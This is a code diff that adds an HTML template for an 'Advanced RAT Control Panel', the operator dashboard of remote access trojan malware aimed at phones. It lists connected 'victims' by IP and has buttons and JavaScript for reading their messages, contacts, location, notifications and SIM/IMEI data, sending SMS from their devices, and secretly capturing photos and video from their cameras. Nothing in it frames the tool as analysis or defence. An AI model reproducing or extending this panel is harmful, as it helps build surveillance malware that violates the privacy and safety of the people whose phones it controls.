@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RAT Control Panel</title>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
+</head>
+<body>
+    <div class="container mt-5">
+        <h1>Advanced RAT Control Panel</h1>
+        <div class="row mt-4">
+            <div class="col-md-12">
+                <h3>Victims List</h3>
+                <table class="table table-bordered">
+                    <thead>
+                        <tr>
+                            <th>Victim IP</th>
+                            <th>Action</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        {% for victim_id, details in victims.items() %}
+                        <tr>
+                            <td>{{ victim_id }}</td>
+                            <td>
+                                <a href="/victim/{{ victim_id }}/view_messages" class="btn btn-primary">View Messages</a>
+                                <a href="/victim/{{ victim_id }}/view_location" class="btn btn-success">See Location</a>
+                                <a href="#" onclick="sendSMS('{{ victim_id }}')" class="btn btn-warning">Send SMS</a>
+                                <a href="/victim/{{ victim_id }}/view_contacts" class="btn btn-info">View Contacts</a>
+                                <a href="/victim/{{ victim_id }}/get_device_info" class="btn btn-secondary">Device Info</a>
+                                <a href="/victim/{{ victim_id }}/get_sim_info" class="btn btn-dark">SIM Info</a>
+                                <a href="/victim/{{ victim_id }}/get_imei" class="btn btn-light">IMEI Number</a>
+                                <a href="#" onclick="capturePhoto('{{ victim_id }}')" class="btn btn-danger">Capture Photo</a>
+                                <a href="#" onclick="recordVideo('{{ victim_id }}')" class="btn btn-success">Record Video</a>
+                                <a href="/victim/{{ victim_id }}/get_notifications" class="btn btn-warning">View Notifications</a>
+                            </td>
+                        </tr>
+                        {% else %}
+                        <tr>
+                            <td colspan="2">No Victims Connected</td>
+                        </tr>
+                        {% endfor %}
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function sendSMS(victim_id) {
+            var number = prompt("Enter phone number:");
+            var message = prompt("Enter message:");
+            if (number && message) {
+                window.location.href = `/victim/${victim_id}/send_sms?number=${number}&message=${message}`;
+            }
+        }
+
+        function capturePhoto(victim_id) {
+            var camera = prompt("Enter camera (front/back):", "back");
+            window.location.href = `/victim/${victim_id}/capture_photo?camera=${camera}`;
+        }
+
+        function recordVideo(victim_id) {
+            var camera = prompt("Enter camera (front/back):", "back");
+            var duration = prompt("Enter video duration (seconds):", "10");
+            window.location.href = `/victim/${victim_id}/record_video?camera=${camera}&duration=${duration}`;
+        }
+    </script>
+</body>
+</html>
